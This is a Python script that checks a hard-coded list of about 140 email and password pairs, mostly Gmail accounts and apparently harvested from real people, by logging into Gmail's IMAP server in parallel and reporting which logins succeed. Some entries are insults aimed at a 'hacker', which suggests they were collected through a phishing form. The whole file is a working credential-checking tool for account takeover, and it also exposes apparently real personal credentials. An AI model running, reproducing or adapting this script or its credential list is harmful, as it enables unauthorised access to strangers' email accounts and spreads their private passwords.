import imaplib
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

accounts = [
    ("zazariaslorica983@gmail.com", "zazariaslorica"),
    ("minnkhainng@gmail.com", "Khaing2468"),
    ("zanyehtoo331@gmail.com", "Jj2008"),
    ("Jekvebpeteros@gmail.com", "Dodong123454321"),
    ("phyu8973@gmail.com", "Ko Htet11"),
    ("arjohnpolendey180@gmail.com", "February012016"),
    ("Marielu@gmail.com", "Sarimeya001"),
    ("koko696936@gmail.com", "Min1234"),
    ("l9lawi2001@gmail.com", "hakzbi2001"),
    ("joeyacosta47@gmail.com", "Joey200625"),
    ("zazariaslorica@gmail.com", "zazariaslorica"),
    ("Polatition23@gmail.com", "09104594366"),
    ("jhonfullestosos8@gmail.com", "Mahalo kita"),
    ("mmsk.kmkl@gmail.com", "MaAloedyakywepy"),
    ("rebeccamagtibay6@gmail.com", "Ksbxisbsks"),
    ("jumongpangawelan@gmail.com", "Aimen143"),
    ("alcoseba383@gmail.com", "Alcoseba111"),
    ("artemkiasko44@gmail.com", "artem@@@artem04"),
    ("goshbotyok@gmail.com", "megosh48"),
    ("mgmgmimi20@gmail.com", "449679740"),
    ("Dmon3717@gmail.com", "Zack172"),
    ("Betlog647474@gmail.com", "Albertpisot09"),
    ("alexroj2442@gmail.com", "Alexander24"),
    ("jabez8030@gmail.com", "Jabeznull123"),
    ("akunbaru61600@gmail.com", "ismadariff00@gmail.com"),
    ("Pyapyae6080@gmail.com", "Peepalyamal"),
    ("MyFrusjt890@gmail.com", "Rrusit762iq"),
    ("Kamekameha0167@gmail.com", "0158917Wan"),
    ("rickadnmorty6@gmail.com", "coolrick666"),
    ("peoxm7010@gmail.com", "Stivan 2005"),
    ("Pk9096764@gmail.com", "279527"),
    ("mihai48postaru@gmail.com", "Scorpion4848(skin 80)"),
    ("Kofmlbn12.13.14@gmail.com", "King2424"),
    ("royemmanuelhdurango@gmail.com", "handayan12"),
    ("shernanvelano143@gmail.com", "441622"),
    ("hayopka23@gmail.com", "Sorrypo"),
    ("Lalpeksang@gmail.com", "Wadgets123987"),
    ("kkyrein@gmail.com", "Hansse1"),
    ("min995970@gmail.com", "Mamber1234567890"),
    ("Black.orb.rru@gmail.com", "( 886-47***-)"),
    ("Lee123@gmail.com", "Leekmklkomaykoloe"),
    ("grizlygrafunzel@gmail.com", "Kontakgm1"),
    ("idunisathsarani@gmail.com", "123qwQ"),
    ("Tangagawakaaccountmo@gmail.com", "TAngaMo123"),
    ("Flow.G@gmail.com", "Myturnonly1432"),
    ("vc4038974@gmail.com", "Vasile1123"),
    ("bsherry42090@gmail.com", "January0115"),
    ("kokoworld124@gmail.com", "komikey123456"),
    ("zinm04655@gmail.com", "9976992284"),
    ("bao.ngh0703@gmail.com", "Bao123456"),
    ("sachoosamalrag@gmail.com", "Sachu903788"),
    ("aklimson@gmail.com", "Klim123kw"),
    ("iloygaming2@gmail.com", "Boy11"),
    ("vitussbritva8@gmail.com", "Oleg1996Q"),
    ("cjeangaming1@gmail.com", "CjeanCaro"),
    ("Tanginamogoogle@gmail.com", "Dika mahal ng mama mo. Gago"),
    ("Kokmzjdggs@gmail.com", "Ksjsjsheh8282L"),
    ("Maliittitemo@gmail.com", "kantutinkita000"),
    ("mmorangu@gmail.com", "Bsnsjsj"),
    ("thein199761@gmail.com", "aungmoe12"),
    ("jasonmeneses89@gmail.com", "Meneses1221"),
    ("mlong68996@gmail.com", "067245770"),
    ("angelimoet@gmail.com", "angel081098"),
    ("Rarasantos@gmail.com", "Raraaaa12345"),
    ("myom37271@gmail.com", "myom37271"),
    ("carl@gmail.com", "YAHOOK"),
    ("gusionchou89@gmail.com", "gwaypyangyi123"),
    ("ezwanleo2@gmail.com", "Panglima5"),
    ("Hakdog@gmail.com", "Diamond"),
    ("Ajsjajajwjan@gmail.com", "Abdjsmn27"),
    ("Fahajanajabni@gmail.com", "Jegsgsjshsbs"),
    ("jayaralutaya2020@gmail.com", "123456789"),
    ("Song47707@gmail.com", "Mcffsguh11"),
    ("beck.brian@gmail.com", "L0ne5tar"),
    ("Kiritoleoz@gmail.com", "Ruby4646"),
    ("kanymsatarovp@gmail.com", "KgZenoXx"),
    ("Mnnafje@gmail.com", "Lulu"),
    ("mmsk.kmkl@gmail.com", "MaAloedyakywepu"),
    ("Hakdyou@gmail.com", "Loveyou1863"),
    ("Kurtjuztin@gmail.com", "Kurtjuztin"),
    ("undred.kinggo@gmail.com", "Isisjshgdhd"),
    ("attailahfernanda@gmail.com", "9876543"),
    ("vincent.pogite@gmail.com", "Garcia8999"),
    ("jcarefamily@gmail.com", "Ramlianthang123"),
    ("htethtet2542019@gmail.com", "Myanmar"),
    ("krodbi.bilack@gmail.com", "Oniichan11"),
    ("Mmspplmal@gmail.com", "Leeplyaml"),
    ("nugagawen@gmail.com", "Stella457631"),
    ("lartemkiasko98088@gmail.com", "artem@@@09"),
    ("kylezkieaking026@gmail.com", "Aking212629"),
    ("gameking99@gmail.com", "99999999a"),
    ("thikethike660@gmail.com", "Hacker123"),
    ("Maxinegomes@gmail.com", "Maybemaxine2004"),
    ("asmodeus2810@gmail.com", "Asmodeus"),
    ("kopaingzaw600@gmail.com", "Kozaw100"),
    ("mihai48postaru@gmail.com", "Karina05"),
    ("gerald@email.com", "angelo"),
    ("wiana.depolier@mail.com", "secra63PM"),
    ("ayuputri1997@mail.com", "putri97"),
    ("Puking inamo @gmail.com", "Anoka Ulol"),
    ("Tae@gmail.com", "pogikaba2"),
    ("Kantot@gmail.com", "123456789"),
    ("KONTOLKAUBESAR0157@GMAIL.COM", "MAMAKKAUNGENTOT"),
    ("Hhhh.gmail.com", "Ineedme"),
    ("Dfhjvbnm@gmai.com", "Fytu655"),
    ("iyaralutaya2020@gamil", "123456789jr"),
    ("amaterasuyoichi@gamail.com", "ajmcaryoshh02"),
    ("forcedvage@gamail.com", "roti00blag"),
    ("Titereako@gamil.com", "Titeangmaghacknito"),
    ("Hakdog@gamil.com", "Antasena96"),
    ("alcoseba383@gmsil.com", "Alcosba111"),
    ("Gawa ka account mo@gmaial.com", "Walamg ganon"),
    ("Kamekameha0167@gmail.com", "Min1234"),
    ("Bobo ka", "Ina mo"),
    ("Iyot tayo", "finger pepe"),
    ("Tanginamo", "Bobo"),
    ("Yawa", "Ka"),
    ("Gago", "Kamo"),
    ("Puta ka masimot", "gago ka hacker"),
    ("Bayot", "Bayot"),
    ("Tae", "pogikaba2"),
    ("Kontl", "Mmk"),
    ("Iyot", "Iyot"),
    ("pepe", "masarap"),
    ("Titi123", "Titi123"),
    ("Kian321", "Kian321"),
    ("Lito123", "Lito123"),
    ("Oon12345", "Oon12345"),
    ("J", "J"),
    ("Onyok1", "Onyok1"),
]

def cek_satu(item):
    email, password = item
    if "@" not in email:
        return (email, "FORMAT_SALAH", "bukan email")
    start = time.time()
    try:
        mail = imaplib.IMAP4_SSL("imap.gmail.com", 993, timeout=15)
        mail.login(email, password)
        mail.logout()
        elapsed = round(time.time() - start, 2)
        return (email, "BERHASIL", f"login sukses dalam {elapsed}s")
    except imaplib.IMAP4.error as e:
        return (email, "GAGAL_AUTH", str(e)[:100])
    except socket.gaierror:
        return (email, "DNS_ERROR", "domain nggak ketemu")
    except socket.timeout:
        return (email, "TIMEOUT", "server nggak jawab")
    except Exception as e:
        return (email, "ERROR_LAIN", str(e)[:100])

def main():
    print(f"Total akun Gmail: {len(accounts)}")
    hasil = []
    with ThreadPoolExecutor(max_workers=5) as ex:
        futures = {ex.submit(cek_satu, acc): acc for acc in accounts}
        for i, fut in enumerate(as_completed(futures), 1):
            email, status, msg = fut.result()
            hasil.append((email, status, msg))
            print(f"[{i}/{len(accounts)}] {email} -> {status} ({msg})")

    print("\n=== RINGKASAN ===")
    c = Counter(h[1] for h in hasil)
    for k, v in c.most_common():
        print(f"{k}: {v}")

    print("\n=== YANG BERHASIL (kalau ada) ===")
    for email, status, msg in hasil:
        if status == "BERHASIL":
            print(f"{email} -> {msg}")

if __name__ == "__main__":
    main()
